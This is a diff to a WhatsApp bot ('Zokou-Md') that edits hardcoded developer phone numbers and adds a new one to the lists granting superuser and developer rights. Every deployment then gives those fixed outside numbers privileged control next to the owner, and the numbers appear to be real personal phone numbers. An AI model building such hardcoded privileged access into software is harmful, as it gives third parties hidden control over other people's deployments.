@@ -148,10 +148,11 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const nomAuteurMessage = ms.pushName;
             const dj = '22559763447';
-            const dj2 = '2250143343357';
+            const dj2 = '22543343357';
             const luffy = '22891733300';
-            var superUser = [servBot, dj, dj2, luffy,conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
-            var dev = [dj, dj2, luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            const dj3="22564297888";
+            var superUser = [servBot, dj, dj3,dj2, luffy,conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+            var dev = [dj, dj2,dj3, luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
             console.log("\t [][]...{Zokou-Md}...[][]");
             console.log("=========== Nouveau message ===========");
